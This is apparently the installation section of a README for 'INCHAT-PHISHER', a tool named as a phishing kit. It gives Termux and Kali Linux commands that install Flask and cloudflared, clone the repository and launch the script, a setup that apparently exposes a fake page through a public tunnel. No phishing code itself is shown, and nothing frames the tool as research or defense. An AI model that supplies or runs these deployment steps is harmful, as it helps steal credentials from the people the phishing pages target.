## Installation (Termux)

```bash
apt update
apt install python git cloudflared 
pip install flask
git clone https://github.com/Dilkhush360284/INCHAT-PHISHER.git
cd INCHAT-PHISHER
cd INCHAT
python inchat.py
```

## Installation (Kali Linux)

```bash
sudo apt update
sudo apt install python3 python3-pip git cloudflared
pip3 install flask
git clone https://github.com/Dilkhush360284/INCHAT-PHISHER.git
cd INCHAT-PHISHER
cd INCHAT
python3 inchat.py
```
